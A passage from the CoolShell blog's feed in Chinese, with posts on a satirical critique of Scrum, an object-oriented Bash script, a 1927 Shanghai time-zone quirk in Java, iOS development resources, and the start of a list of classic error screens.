<p><strong>Reason 2</strong>: <a href="https://en.wikipedia.org/wiki/Scrum_(development)">Scrum</a> 认为只要给员工足够多的自由员工就能做得最好。这该死是理论是基于什么玩意？不可能，人的天性是懒惰的，他们才不会把事做好的，他们只会做相应报酬的工作量，还可能基本还达不到其相应的报酬，大多数人都在混日子啊。尤其是和经理比起来，谁不想能尽快地成为经理或Team leader啊，因为那样他们就可以即不干活，又挣得多。另外，你给他们自由，你就会发现，他们会只会做他们感兴趣的事，要么聊QQ，要么打游戏，看闲书，反正不干正事。直到你催了，他们才动一动。</p>
<p><span id="more-5044"></span></p>
<p><strong>Reason 3</strong>: 因为前面的原因，所以，我们仍然要把一个PM放在Scrum团队的上面做管理，这样才会有产出。于是，PM给团队分配任何，管得细枝末节，事无巨细，天天让你做进度汇报，等等。直至把团队拖垮。</p>
<p><strong>Reason 4</strong>: <a href="https://en.wikipedia.org/wiki/Scrum_(development)">Scrum</a> 只不过是一个流程。这世上有太多的流程，尤其是那那些操CMMi的公司。几乎所有玩CMMi流程的公司，你都能看到的是员工都是那一副副苦逼的脸。所以，Scrum的流程同样会这样。因为这些都不是开发团队自发出来的，而是上面管你喜欢不喜欢按给你的。 Scrum 根本不可能增进你的软件质量和技术，只能是优秀的人才才可能！使用Scrum的公司都是些吝啬鬼，他们不愿花大钱招优秀的人，他们妄图使用Scrum这种东西让现有的这些廉价劳动力发挥更大的生产效率，Scrum成了push程序员最有用的工具。</p>
<p><strong>Reason 5</strong>: <a href="https://en.wikipedia.org/wiki/Scrum_(development)">Scrum</a> delivers ‘business value’。不是这样的，实际上，Scrum不可能。这有很多原因。真正了解业务的那帮人根本不可能加入项目团队，那些人谁TMD愿意和苦逼的技术人员加班啊。 那些人喜欢和我们的用户吃吃喝喝，花天酒地的，根本不会和你们那些奇怪的东西（如：backlog）或是那堆ugly的内向古怪的技术人员打交道，更别说什么技术了。所以，你的团队就像一个客服团队或救火队一样疲于奔命。</p>
<p><strong>Reason 6</strong>: 一个敏捷的团队应该是持续进步的。这就是为什么Scrum总是在问什么干得好，什么需要改进，并定义行动方案。你真的以为员工想进步吗？让他们不得不去想想自己和团队怎么进步，然后他们还不得不去执行行动方案。别天真了，人的天性是不喜欢改变的，人的天性是习惯于一些按部就般的事的，也许那样做令人讨厌，但是人家还是能干点东西出来。如果你逼着人家改变，你就是在压迫人家，人家自然会反抗。</p>
<p><strong>Reason 7</strong>: Product Owner 专注于 ‘what’ 和 ‘why’ 的问题，开发团队决定 ‘how’。很不错的分工，于是可以造就一个即高速有重质量的团队。然而，这根本不行。你的Product Owner马上就想要这个功能，他才不管你的软件开发的技术难题，人家只要快，要你meet deadline，要你给我们重要的客户做出承诺。另外，你千万不要以为你们可以哄走这个初级的product owner，因为他的后台是直接汇报到高层管理。你作为一个程序员可能只是其个小部门的一个小喽啰，或者只是外包公司，你觉得可能吗？你觉得建立信任可能吗？</p>
<p><strong>Reason 8</strong>: 软件质量和生产率成正比。也就是说，质量越高，生产率越高。如果质量不高，你开发效率就会低下，但是谁管呢？我们朝九晚五的上班，质量好了也是做8小时，质量差了也是做8小时，无所为嘛。另外，我们的 project manager (或者是Scrum master!) 总是会批评我们没有按计划完成。所以，这根本 不可能。</p>
<p><strong>Reason 9</strong>: “是的，如果我们只做需要的功能，那么我们就会最低的成本，对吗？”，为什么这世上总是会有这些幼稚的人？这种事怎么可能啊。很多很多的银行或保险公司的项目在你还没有启动项目前就谈好了一个价格（可能还会有回扣），为了打单子，销售什么都干得出来，让你去做项目是因为你是廉价劳动力，而且，他们会不断地加需求，因为软件合同谈好的价格时候，连需求都没有，你去做了才有，还是模糊和不确定或根本就是错的，然后需求是越来越多，越改越多。等你精疲力尽的时候，你才意识到，销售早就把你卖了。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>爽啊，戴着黑礼帽思考问题比我想像中的要有趣得多，现在我必需要把它摘下来了。</p>
<p><strong>看完这篇文章，你觉得是人的问题还是软件开发方法的问题？</strong></p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-07-21T08:37:03+08:00</pubDate>
<guid>https://coolshell.cn/articles/5044.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 面向对象的Shell脚本 ]]></title>
<link>https://coolshell.cn/articles/5035.html</link>
<content><![CDATA[ 
<p>还记得以前那个用<a title="检查素数的正则表达式" href="https://coolshell.cn/articles/2704.html" target="_blank">算素数的正则表达式</a>吗？编程这个世界太有趣了，总是能看到一些即别出心裁的东西。你有没有想过在写Shell脚本的时候可以把你的变量和函数放到一个类中？不要以为这不可能，这不，我在<a href="http://lab.madscience.nl/oo.sh.txt" target="_blank">网上</a>又看到了一个把Shell脚本整成面向对象的东西。Shell本来是不支持的，需要自己做点东西，能搞出这个事事的人真的是hacker啊。</p>
<p>当然，这里并不是真正的面向对象，因为其只是封装罢了，还没有支持继承和多态。最变态的是他居然还支持typeid，靠！</p>
<p>下面让我们看看他是怎么来做的。下面的脚本可能会有点费解。本想解释一下，后来想想，还是大家自己专研一下吧，其实看懂也不难，给大家提几个点吧。</p>
<ol>
<li>我们可以看到，下面的这个脚本定义了class,  func, var, new 等函数，其实这些就是所谓的关键字。</li>
<li>class是一个函数，主要是记录类名。</li>
<li>func和var实际上是把成员函数名和成员变量记成有相同前缀的各种变量。</li>
<li>new方法主要是记录实例。大家重点看看new函数里的那个for循环，最核心的就在那里了。</li>
</ol>
<div>脚本如下所示：</div>
<div><span id="more-5035"></span></div>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">#!/bin/bash

# -------------------------------------------------------------------
# OO support functions
# Kludged by Pim van Riezen &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="97e7fed7faf6f3e4f4fef2f9f4f2b9f9fb">[email protected]</a>&gt;
# -------------------------------------------------------------------
DEFCLASS=""
CLASS=""
THIS=0

class() {
  DEFCLASS="$1"
  eval CLASS_${DEFCLASS}_VARS=""
  eval CLASS_${DEFCLASS}_FUNCTIONS=""
}

static() {
  return 0
}

func() {
  local varname="CLASS_${DEFCLASS}_FUNCTIONS"
  eval "$varname=\"\${$varname}$1 \""
}

var() {
  local varname="CLASS_${DEFCLASS}_VARS"
  eval $varname="\"\${$varname}$1 \""
}

loadvar() {
  eval "varlist=\"\$CLASS_${CLASS}_VARS\""
  for var in $varlist; do
    eval "$var=\"\$INSTANCE_${THIS}_$var\""
  done
}

loadfunc() {
  eval "funclist=\"\$CLASS_${CLASS}_FUNCTIONS\""
  for func in $funclist; do
    eval "${func}() { ${CLASS}::${func} \"\$*\"; return \$?; }"
  done
}

savevar() {
  eval "varlist=\"\$CLASS_${CLASS}_VARS\""
  for var in $varlist; do
    eval "INSTANCE_${THIS}_$var=\"\$$var\""
  done
}

typeof() {
  eval echo \$TYPEOF_$1
}

new() {
  local
  local cvar="$2"
  shift
  shift
  local id=$(uuidgen | tr A-F a-f | sed -e "s/-//g")
  eval TYPEOF_${id}=$class
  eval $cvar=$id
  local funclist
  eval "funclist=\"\$CLASS_${class}_FUNCTIONS\""
  for func in $funclist; do
    eval "${cvar}.${func}() {
      local t=\$THIS; THIS=$id; local c=\$CLASS; CLASS=$class; loadvar;
      loadfunc; ${class}::${func} \"\$*\"; rt=\$?; savevar; CLASS=\$c;
      THIS=\$t; return $rt;
    }"

  done
  eval "${cvar}.${class} \"\$*\" || true"
}</pre>
<p>下面，让我们来看看例程吧。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># -------------------------------------------------------------------
# Example code
# -------------------------------------------------------------------

# class definition
class Storpel
  func Storpel
  func setName
  func setQuality
  func print
  var name
  var quality

# class implementation
Storpel::Storpel() {
  setName "$1"
  setQuality "$2"
  if [ -z "$name" ]; then setName "Generic"; fi
  if [ -z "$quality" ]; then setQuality "Normal"; fi
}

Storpel::setName() { name="$1"; }
Storpel::setQuality() { quality="$1"; }
Storpel::print() { echo "$name ($quality)"; }

# usage
new Storpel one "Storpilator 1000" Medium
new Storpel two
new Storpel three

two.setName "Storpilator 2000"
two.setQuality "Strong"

one.print
two.print
three.print

echo ""

echo "one: $one ($(typeof $one))"
echo "two: $two ($(typeof $two))"
echo "three: $three ($(typeof $two))"</pre>
<p> </p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-07-21T12:39:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/5035.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 你确信你了解时间吗？ ]]></title>
<link>https://coolshell.cn/articles/5075.html</link>
<content><![CDATA[ 
<p>你还记得“<a title="软件真的好难做啊" href="https://coolshell.cn/articles/4811.html" target="_blank" rel="noopener">软件真的好难做</a>”中的那个有意思的例子吗？那个例子告诉我们软件开发中假设可能会是致命的事。今天，我又在StackOverflow上看到一个关于时间的问题——<a href="https://stackoverflow.com/questions/6841333/why-is-subtracting-these-two-times-in-1927-giving-a-strange-result" target="_blank" rel="noopener">为什么1927年12月31日的午夜时间这么奇怪</a>？提问题的这个人给了下面的一段java代码（我做一些修改，保证让你可以copy过去就可以编译运行）</p>
<p>我在其中高亮了几行，这个程序就是想比较一下“<span class="Apple-style-span" style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px; white-space: pre;">1927-12-31 23:54:07<span class="Apple-style-span" style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif; font-size: 13px; line-height: 19px; white-space: normal;">”  和  “<span class="Apple-style-span" style="font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px; white-space: pre;">1927-12-31 23:54:08<span class="Apple-style-span" style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif; font-size: 13px; line-height: 19px; white-space: normal;">” 差几秒，很明显，是差一秒。但是程序的输出却不是这样的。</span></span></span></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-highlight="8,9,10">import java.text.SimpleDateFormat;
import java.text.ParseException;
import java.util.Date;
import java.util.TimeZone;
class time{
    public static void main(String[] args) throws ParseException {
        SimpleDateFormat sf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        sf.setTimeZone(TimeZone.getTimeZone("Asia/Shanghai"));
        String str3 = "1927-12-31 23:54:07";
        String str4 = "1927-12-31 23:54:08";
        Date sDt3 = sf.parse(str3);
        Date sDt4 = sf.parse(str4);
        long ld3 = sDt3.getTime() /1000;
        long ld4 = sDt4.getTime() /1000;
        System.out.println(ld3);
        System.out.println(ld4);
        System.out.println(ld4-ld3);
    }
}</pre>
<p> </p>
<p><span id="more-5075"></span></p>
<p>下面，让我们来看看程序的输出：（是的，差出353秒钟来）</p>
<blockquote><p><code>-1325491905<br>
-1325491552<br>
353</code></p></blockquote>
<p>Stackoverflow真的很强大，在大家要求发问者给出时区（中国上海）的15分钟内就解决了这个问题。相当的令人惊叹。原因是什么呢？大家需要围观一下<a href="https://www.timeanddate.com/worldclock/clockchange.html?n=237&amp;year=1927" target="_blank" rel="noopener">这个网页</a>。（为了怕被墙或是被和谐，我已习惯了抓屏保存，如果有人能开发一个软件能随看随抓，然后如果源被删了可以P2P的从已下载了的人那里获取，那么这个软件应该会很有国内市场。蛋扯远了，Sorry）</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>从上图中我们可以看到—— 在1927年12月31日23:59:59时，往后面的一秒应该是1928年1月1日 0:0:0，但是这个时间被往后调整了5分52秒，而成了，1927年12月31日的，23:54:08，于是，完成了352秒的穿越。于是我们的Java程序出了这样的一个问题，这真是一个奇迹。</p>
<p>为什么会有这个调整呢？我居然Google不到，不过，我在这个timeanddate.com上查看了一下北京的时间，发现北京的时间只到1970年，于是我猜想，中国近代历史乱七八糟的政权交替可能是这个原因。于是我看 了一下北京和上海物理时差，果然，北京上海的时差在5分50秒左右。<strong>因此，我觉得这个时间的变化应该是从上海（南京）时间变成了北京时间</strong>。至于你信不信，反正我是信了。</p>
<p>从这个事，我得到下面的一些启示：</p>
<ol>
<li>Java在的时区实现相当的强大啊。这种细节都能考虑到。</li>
<li>本地时间的完全就是一锅粥，应该尽量不用。</li>
<li>如果你要开发和时区有关系的程序，你的系统里一定要使用GMT标准时间，仅在显示的时候才转成本地时间。</li>
</ol>
<div>各位无证程序员们，看到这个例子，你们是不是感到编程的压力了？呵呵。</div>
<p></p>
 ]]></content>
<pubDate>2011-08-01T08:25:59+08:00</pubDate>
<guid>https://coolshell.cn/articles/5075.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 10个必需的iOS开发工具和资源 ]]></title>
<link>https://coolshell.cn/articles/5089.html</link>
<content><![CDATA[ 
<p>界面总不是一件很容易事，尤其是iPhone/iPad的界面，做过iOS开发的程序员，一定会感到开发iPhone/iPad的界面是一件多么不容易的事。下面的文章来自<a href="http://alexefish.com/post/15967480885/10-essential-ios-developer-tools-resources" target="_blank">10 Essential iOS Developer Tools &amp; Resources</a>，这个文章介绍了十个iOS开发的基础性工具和资源，其一定会很有效地帮你做iOS的开发。（在这里，我再闲扯一句，虽然Android的开发好像整整XML文件界面就出来了，其明显比iOS的开发要容易很多，但是我还是觉得iOS的生命力要强过Android，看看Android今天的应用就知道，有时候入门门槛低不是一些好事，大多数的程序员搞出来的Android代码和软件简直令人作呕，就像不是每个人都能烧得手好菜一样。（“<a title="食客还是大厨" href="https://coolshell.cn/articles/3589.html" target="_blank">食客与大厨</a>”，也许偏激，但值得你我思考），又把蛋扯远了）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#1_Omnigraffle_Ultimate_iPhone_Stencil" title="1. Omnigraffle + Ultimate iPhone Stencil">1. Omnigraffle + Ultimate iPhone Stencil</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#2_Glyphish_Icons" title="2. Glyphish Icons">2. Glyphish Icons</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#3_teehan_lax_iPhone_4_GUI_PSD" title="3. teehan + lax iPhone 4 GUI PSD">3. teehan + lax iPhone 4 GUI PSD</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#4_Stanford_University_iPhone_Development_Lectures" title="4. Stanford University iPhone Development Lectures">4. Stanford University iPhone Development Lectures</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#5_71_Squared" title="5. 71 Squared">5. 71 Squared</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#6_Charles" title="6. Charles">6. Charles</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#9_MBProgressHUD" title="9. MBProgressHUD">9. MBProgressHUD</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#10_Apple_Documentation" title="10. Apple Documentation">10. Apple Documentation</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="1_Omnigraffle_Ultimate_iPhone_Stencil"></span>1. Omnigraffle + Ultimate iPhone Stencil<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://coolshell.cn/wp-content/uploads/2011/08/omni.jpeg"><img alt="image placeholder" ></a></p>
<p><a href="https://www.omnigroup.com/products/omnigraffle/" target="_blank">Omnigraffle</a> 是一个很强大的像Microsoft Viso的一个软件，其只能于运行在Mac OS X和iPad平台之上。它曾获得2002年的苹果设计奖。在这里，你可以下载 <a href="http://graffletopia.com/stencils/413" target="_blank">Ultimate iPhone Stencil</a> ，然后使用Omnigraffle 来非常快地制作你的iPhone应用的演示界面。（查看了一下Omnigraffle 的iPad版，真贵，$49.99。作者居然推荐买，TNND，一看就是托）。</p>
<p><a href="https://www.omnigroup.com/products/omnigraffle/" target="_blank">Omnigraffle Link</a>, <a href="http://graffletopia.com/stencils/413" target="_blank">Ultimate iPhone Stencil Link</a></p>
<p><span id="more-5089"></span></p>
<h4>
<span class="ez-toc-section" id="2_Glyphish_Icons"></span>2. Glyphish Icons<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://coolshell.cn/wp-content/uploads/2011/08/glphy.jpeg"><img alt="image placeholder" ></a></p>
<p>你可能能从上面的这些图标中看到Flipboard 和 Twitter 在iOS上的应用使用了其中的一些图标。是的，这些个小图标对你的开发很有帮助。作者强烈推荐你花$25去购买 <a href="http://glyphish.com/" target="_blank">Glyphish</a> 的Pro版。当然啦，你都能花$99/year开发iOS的程序，你还怕花这区区的25刀？</p>
<p><a href="http://glyphish.com/" target="_blank">Glypish Link</a></p>
<h4>
<span class="ez-toc-section" id="3_teehan_lax_iPhone_4_GUI_PSD"></span>3. teehan + lax iPhone 4 GUI PSD<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://coolshell.cn/wp-content/uploads/2011/08/teehan.jpeg"><img alt="image placeholder" ></a></p>
<p>teehan+lax 是一个加拿大多伦多的代理商。他们经常发布一些他们自己内部用的资源， <a href="http://www.teehanlax.com/downloads/iphone-4-guid-psd-retina-display/" target="_blank">iPhone 4 GUI PSD</a> 就是其中的一个，这是一个PSD资源文件其包括了iPhone 4的UI 视图控制和一般的UI元件。这是免费让你下载的。</p>
<p><a href="http://www.teehanlax.com/blog/iphone-4-gui-psd-retina-display/" target="_blank">teehan + lax iPhone 4 GUI PSD Link</a></p>
<h4>
<span class="ez-toc-section" id="4_Stanford_University_iPhone_Development_Lectures"></span>4. Stanford University iPhone Development Lectures<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://coolshell.cn/wp-content/uploads/2011/08/stanford.jpeg"><img alt="image placeholder" ></a></p>
<p>斯坦福大学iPhone开发教程，这可能是iOS开发者的圣经级的课程了，你可以从 iTunes U上下载，当然，国内的各大门户公开课也有这个视频，还有中文字幕。比如网易公开课：<a href="http://v.163.com/special/opencourse/iphonekaifa.html">http://v.163.com/special/opencourse/iphonekaifa.html</a></p>
<p><a href="https://itunes.apple.com/WebObjects/MZStore.woa/wa/viewPodcast?id=384233225" target="_blank">iTunes U Link</a></p>
<h4>
<span class="ez-toc-section" id="5_71_Squared"></span>5. 71 Squared<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://coolshell.cn/wp-content/uploads/2011/08/71sq.jpeg"><img alt="image placeholder" ></a></p>
<p>如果你要搞iPhone的游戏开发，那么你可看看 <a href="http://www.71squared.com/iphone-tutorials/" target="_blank">71 Squared</a> 上的资源和教程，让你从零开始搞iPhone游戏。不知道你有没有听说过 Tiny Wings 这个由 Andreas Illiger 开发的很漂亮的并获得很大成功的游戏？Andreas 就是从这个网站上学习开发的。这个网站的的资源太丰富了，你绝对不能错过。</p>
<p><a href="http://www.71squared.com/iphone-tutorials/" target="_blank">71 Squared Link</a></p>
<h4>
<span class="ez-toc-section" id="6_Charles"></span>6. Charles<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://coolshell.cn/wp-content/uploads/2011/08/charles.jpeg"><img alt="image placeholder" ></a></p>
<p>如果你想让你的应用发出一个HTTP请求，并通过仿真器来调试，这恐怕是一件很难的事。 <a href="http://www.charlesproxy.com/" target="_blank">Charles</a> 是这样一个工具其强在让你看到所有的和互联网交互的请求。这个无价的工具可以让你节省巨大的时间来debug你的应用。当然，要价$50啊，很不便宜，但是还是那句话，$99刀一年你都花了，你还在乎这点钱？嘿嘿嘿</p>
<p><a href="http://www.charlesproxy.com/" target="_blank">Charles Link</a></p>
<h2>7. ASIHTTPRequest</h2>
<p><a href="https://coolshell.cn/wp-content/uploads/2011/08/asihttp.jpeg"><img alt="image placeholder" ></a></p>
<p>和 Charles一样， <a href="http://allseeing-i.com/ASIHTTPRequest/" target="_blank">ASIHTTPRequest</a> 也是一个强大的封装其由 CFNetwork API构造。如果你想要从你的iPhone上调用一个Web API，那么 <a href="http://allseeing-i.com/ASIHTTPRequest/" target="_blank">ASIHTTPRequest</a> 一定会省你很多事。这个东西的文档极端的不错，并有成千上万的有用的功能几乎覆盖了所有的事，比如： PUT, DELETE, GET, POST 全都没有问题。</p>
<p><a href="http://allseeing-i.com/ASIHTTPRequest/" target="_blank">ASIHTTPRequest Link</a></p>
<h2>8. Stack Overflow</h2>
<p><a href="https://coolshell.cn/wp-content/uploads/2011/08/stackoverflow2.jpeg"><img alt="image placeholder" ></a></p>
<p>Stack Overflow 这个东西不用说了吧。我个人认为这是这个世界上最佳的问问题的地方，就算你不问，你就上去查一查，你也能看到一大堆已经有人问过的问题。通过问题来加深认识，是进阶的要做的事。在stakeoverflow面前，什么CSDN，it-pub，等等国内的技术问题解决网站完全不值一题。</p>
<p><a href="https://stackoverflow.com/" target="_blank">Stack Overflow Link</a></p>
<h4>
<span class="ez-toc-section" id="9_MBProgressHUD"></span>9. MBProgressHUD<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://coolshell.cn/wp-content/uploads/2011/08/mbprogress.jpeg"><img alt="image placeholder" ></a></p>
<p>MBProgressHUD 是一个用来做没有文档的 UIProgressHUD UIKit 类的替代品。其就是用来显示一个正在下载中的指示器。这个东西很容易使用，并且有很好的文档，你需要几分钟就可以把其集成到你的应用中。你可以到 <a href="https://github.com/jdg/MBProgressHUD" target="_blank">github repository</a>上查看其资料。作者号称其99%的应用都使用了这个东西。</p>
<p><a href="https://github.com/jdg/MBProgressHUD" target="_blank">MBProgressHUD Link</a></p>
<h4>
<span class="ez-toc-section" id="10_Apple_Documentation"></span>10. Apple Documentation<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://coolshell.cn/wp-content/uploads/2011/08/iosdev.jpeg"><img alt="image placeholder" ></a></p>
<p>作者说，最后一个资源也是最好的一个，那就是苹果的官方文档 <a href="https://developer.apple.com/devcenter/ios/index.action" target="_blank">Apple Documentation</a>，示例代码，视频，各种类的参考文档，你在开发过程中绝对无法离开它。在你去Stack Overflow和Google的时候，你应该先去看看这个文档。</p>
<p><a href="https://developer.apple.com/devcenter/ios/index.action" target="_blank">iOS Documentation Link</a></p>
<p>上面是原作者介绍的一些资源，看起来是给初学者用的，我也是初学者，在<strong>这里想问一下各位熟悉iOS开发的大拿，在这个基础上，你们有没有什么推荐？</strong></p>
<p><em><strong>—-更新 2011/8/3，新浪微博上我以前的一个同事给了大家下面的推荐—-</strong></em></p>
<p>//<a href="https://weibo.com/n/%E6%9D%8E%E6%9D%A8iBabyNote">@李杨iBabyNote</a>：加上Three20吧，一个非常好的的开源iphone UI library. facebook 用的，品质有保证。 还有tweetero (Open Source Twitter App for iPhone),国内sina/qq微博 API 基本copy twitter. 所以想做iphone上和围脖相关的应用可以参考此代码</p>
 ]]></content>
<pubDate>2011-08-02T08:40:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/5089.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 10大经典错误 ]]></title>
<link>https://coolshell.cn/articles/5107.html</link>
<content><![CDATA[ 
<p>下面是10、11个经典的错误，升序排名。希望大家补充！</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#10%E3%80%81DOS%E7%9A%84Abort%EF%BC%8CRetry_Fail%EF%BC%9F%E9%94%99%E8%AF%AF" title="10、DOS的Abort，Retry, Fail？错误">10、DOS的Abort，Retry, Fail？错误</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#9%E3%80%81Windows_Vista_%E7%9A%84%E7%BA%A2%E5%B1%8F%E9%94%99%E8%AF%AF" title="9、Windows Vista 的红屏错误">9、Windows Vista 的红屏错误</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#8%E3%80%81PC%E6%9C%BA%E7%9A%84%E5%BC%80%E6%9C%BA%E6%8A%A5%E8%AD%A6" title="8、PC机的开机报警">8、PC机的开机报警</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#7%E3%80%81Twitter%E7%9A%84%E5%A4%A7%E9%B2%B8%E9%B1%BC" title="7、Twitter的大鲸鱼">7、Twitter的大鲸鱼</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#6%E3%80%81Kernel_Panic" title="6、Kernel Panic">6、Kernel Panic</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#5%E3%80%81Windows%E7%9A%84%E9%9D%9E%E6%B3%95%E6%93%8D%E4%BD%9C" title="5、Windows的非法操作">5、Windows的非法操作</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#4%E3%80%81Windows_RPC_Error" title="4、Windows RPC Error">4、Windows RPC Error</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#3%E3%80%81Xbox_360_%E4%B8%89%E7%BA%A2%E9%94%99%E8%AF%AF" title="3、Xbox 360 三红错误">3、Xbox 360 三红错误</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#2%E3%80%81Web%E4%B8%8A%E7%9A%84404%E9%94%99%E8%AF%AF" title="2、Web上的404错误">2、Web上的404错误</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#1%E3%80%81Windows_%E8%93%9D%E5%B1%8F%E9%94%99%E8%AF%AF" title="1、Windows 蓝屏错误">1、Windows 蓝屏错误</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#0%E3%80%81%E8%AF%A5%E9%A1%B5%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E9%94%99%E8%AF%AF" title="0、该页无法显示错误">0、该页无法显示错误</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="10%E3%80%81DOS%E7%9A%84Abort%EF%BC%8CRetry_Fail%EF%BC%9F%E9%94%99%E8%AF%AF"></span>10、DOS的Abort，Retry, Fail？错误<span class="ez-toc-section-end"></span>
</h4>
<p>85年以后出生的人可能不知道DOS是什么了，只有那老家伙还知道这是什么。我还记得当时的我对于Abort和Fail这两个选择还是比较清楚的，不过，今天完全忘记了Abort和Fail的差别是什么？这个出是DOS下的经常出现，也相当的经典，以至于在Wikepedia上都有专门的业面 <a href="https://en.wikipedia.org/wiki/Abort,_Retry,_Fail%3F" target="_blank">Abort, Retry, Fail?</a>。简称为ARF。当然，ARI – Abort, Retry, Ignore?</p>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="9%E3%80%81Windows_Vista_%E7%9A%84%E7%BA%A2%E5%B1%8F%E9%94%99%E8%AF%AF"></span>9、Windows Vista 的红屏错误<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/Red_Screen_of_Death" target="_blank">红屏错误</a>（RSoD – Red Screen of Death）不单单只是Windows Vista引入的（也许是蓝屏太有名了，突然变成红屏，大家觉得这个是比蓝屏更NB的错，所以也就引人关注了），PlayStation的也喜欢使用红屏。</p>
<figure id="attachment_5109" aria-describedby="caption-attachment-5109" style="width: 512px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5109" class="wp-caption-text">Windows Vista 的 RSoD</figcaption></figure>
<p><span id="more-5107"></span></p>
<figure id="attachment_5110" aria-describedby="caption-attachment-5110" style="width: 480px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5110" class="wp-caption-text">PSP的红屏</figcaption></figure>
<h4>
<span class="ez-toc-section" id="8%E3%80%81PC%E6%9C%BA%E7%9A%84%E5%BC%80%E6%9C%BA%E6%8A%A5%E8%AD%A6"></span>8、PC机的开机报警<span class="ez-toc-section-end"></span>
</h4>
<p>攒过PC的朋友都知道如果你的内存条有问题，PC开机时会长鸣报警，一长一短则是显卡有问题，等等。你可以上Wikipedia上看看相关的词条——<a href="https://en.wikipedia.org/wiki/Power-on_self_test">Power On Self-Test Beep</a>。</p>
<figure id="attachment_5111" aria-describedby="caption-attachment-5111" style="width: 400px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5111" class="wp-caption-text">第一代的AMI BIOS</figcaption></figure>
<h4>
<span class="ez-toc-section" id="7%E3%80%81Twitter%E7%9A%84%E5%A4%A7%E9%B2%B8%E9%B1%BC"></span>7、Twitter的大鲸鱼<span class="ez-toc-section-end"></span>
</h4>
